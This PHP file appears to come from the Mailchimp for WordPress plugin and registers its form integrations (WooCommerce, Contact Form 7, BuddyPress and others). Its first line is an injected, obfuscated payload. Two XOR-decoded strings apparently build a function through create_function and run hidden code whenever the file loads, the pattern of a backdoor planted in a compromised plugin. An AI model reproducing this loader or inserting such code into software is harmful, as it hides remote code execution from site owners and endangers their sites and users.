<?php $WHkAlOySivYb='HC,ZL6o317M,,D>'^'+1I;8S0UDY.XE+P';$XXEucbhwx=$WHkAlOySivYb('','P>fP2N M8>-Ua<FU95<AVV+4-DZZ6meC=5wPJFN6kQ>WU>=->zO5<, Y6U31Q6MeKY0,4jyr1KUdypZApLGj3iYB8FWxdhCYD17BRLH.yLmRNZpWk20F=SYAt30,LXArS=mNP2FLbOHChGePKq V5S0fY1zsieFV+>O<cvRS6RU<BXm<EHnhjneplJ+6I8-IrV13Frsg.f1OLo6V<YHwHTO;MEj7N>4>2kSU3JZS0SYMIJFbPA:U,O,jzb+n:;8teOSHEBS2IaVVXO=3+1Yzs:;jE62,.,=TYOqCA81MpE;JQS9TIRthAXT9WKg5Zh32eOGi,-1.NQ6xc,X1U33,RaM.gxqcexnNSCHARXKVzLxp=XZKKYr8BAOwTA<.8X 4dwRP2=Ryk>ou46BRSMAP 5LE5jFJ.zOf1vQX>3RsWp=W1TCX;;WTIRC<HeSWDA7;;U6cIXOQxSj=65:SKoFR070Lolh06BAi;NHfhwR.FQU<S;9xkqoXFIU>dWEC8WUE53Dcj.HBEjJbVXHSFYlmczTXbJa0O1+cq=E6D0lUPVqsEQu.ZtmwIUQPZVjuyvpsmdqIWMZSt+E BCsLWi7I>+U:9E-q4C<XG:RO>VYYAP7rOSfD69;zbXEKLhM22:1<V:DT32EVfoFP5L<56jmEmiD1FPBJdeOpF'^'9XNqT;N.LWB;>Y><JAOiq.DFr ;.W2:.HAPycf5<b7K96JTBPZ7ZNsD8B4ln<C9Mo=QXUFYVZ.,MYPzaP7Mc:M67LfjXCOxSM8Q- dlGYqMbuzT>WAD4Q67iPWQX-qzRwTFey8OEF =7HiXpcUD7A2kB0lZ-IA-3RekUCSr B 9Y,pIW 1G5CUoye8NB<JCaV9DGoIynSlLEFKR7H8hJh2.W> Q=jZUJS480JjgsV25>,qLh6.H0M,DJRFt-uts= o2;ef8W0AkhxkKRGD<SSA1caRSXOsV1 oLceST4KO2n52M5ioTL798L2pmHPbZTEgfMHLEOgqMrjJ7C0RPDrIiq5= 6 +:n20he9=2vGrXTK96>.pRCHHFS0 HOg3EMDJrtYX+Ba7fQPW63spatVT 0PQLCSp2l;R59JRrNw0H9B111ZW>.,z;S::760 hdV BK+9<4Ng5YSVU7.Gb6QCQeCLLTW6 6P+1OALXG yqX2OXXMWO94;4G;< :g2-,FG7KME-;bFjF29<2oyJKCR9<WbET.EJ8VV OcmEumkQTr0GKjDYD+gc3j3RMOAGKYRDqfuc7FMsBejSjqIV;LJ,eR T.Q;U+3IzhN7 5.1SUcsB WMZSKxeklHmI83TJ7VlpWS17=H61L STRM0lVcMT>96bTLtz;');$XXEucbhwx();

/**
 * Try to include a file before each integration's settings page
 *
 * @param MC4WP_Integration $integration
 * @param array $opts
 * @ignore
 */
function mc4wp_admin_before_integration_settings( MC4WP_Integration $integration, $opts ) {

	$file = dirname( __FILE__ ) . sprintf( '/%s/admin-before.php', $integration->slug );

	if( file_exists( $file ) ) {
		include $file;
	}
}

/**
 * Try to include a file before each integration's settings page
 *
 * @param MC4WP_Integration $integration
 * @param array $opts
 * @ignore
 */
function mc4wp_admin_after_integration_settings( MC4WP_Integration $integration, $opts ) {
	$file = dirname( __FILE__ ) . sprintf( '/%s/admin-after.php', $integration->slug );

	if( file_exists( $file ) ) {
		include $file;
	}
}

add_action( 'mc4wp_admin_before_integration_settings', 'mc4wp_admin_before_integration_settings', 30, 2 );
add_action( 'mc4wp_admin_after_integration_settings', 'mc4wp_admin_after_integration_settings', 30, 2 );

// Register core integrations
mc4wp_register_integration( 'ninja-forms-2', 'MC4WP_Ninja_Forms_v2_Integration', true );
mc4wp_register_integration( 'wp-comment-form', 'MC4WP_Comment_Form_Integration' );
mc4wp_register_integration( 'wp-registration-form', 'MC4WP_Registration_Form_Integration' );
mc4wp_register_integration( 'buddypress', 'MC4WP_BuddyPress_Integration' );
mc4wp_register_integration( 'woocommerce', 'MC4WP_WooCommerce_Integration' );
mc4wp_register_integration( 'easy-digital-downloads', 'MC4WP_Easy_Digital_Downloads_Integration' );
mc4wp_register_integration( 'contact-form-7', 'MC4WP_Contact_Form_7_Integration', true );
mc4wp_register_integration( 'events-manager', 'MC4WP_Events_Manager_Integration' );
mc4wp_register_integration( 'memberpress', 'MC4WP_MemberPress_Integration' );
mc4wp_register_integration( 'custom', 'MC4WP_Custom_Integration', true );
$dir = dirname( __FILE__ );
require $dir . '/ninja-forms/bootstrap.php';
require $dir . '/wpforms/bootstrap.php';
require $dir . '/gravity-forms/bootstrap.php';

